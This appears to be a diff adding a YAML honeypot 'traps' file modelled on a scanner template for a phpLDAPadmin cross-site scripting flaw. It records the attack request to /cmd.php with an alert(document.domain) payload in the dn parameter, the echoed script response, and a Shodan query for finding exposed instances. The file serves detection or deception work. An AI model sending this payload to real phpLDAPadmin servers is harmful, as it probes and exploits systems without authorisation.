@@ -1,0 +1,41 @@
+id: phpldapadmin-xss
+info:
+  name: PHP LDAP Admin < 1.2.5 - Cross-Site Scripting
+  author: GodfatherOrwa,herry
+  description: PHP LDAP Admin is vulnerable to XSS.
+  severity: medium
+  reference:
+  - https://twitter.com/GodfatherOrwa/status/1701392754251563477
+  metadata:
+    verified: true
+    max-request: 9
+    shodan-query: html:"phpLDAPadmin"
+  tags: php,phpldapadmin,xss
+traps:
+- request:
+    method: GET
+    path: ''
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <script>alert(document.domain)</script>No such entry
+- request:
+    method: GET
+    path: /cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /index.php?redirect=true&meth=ajax
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
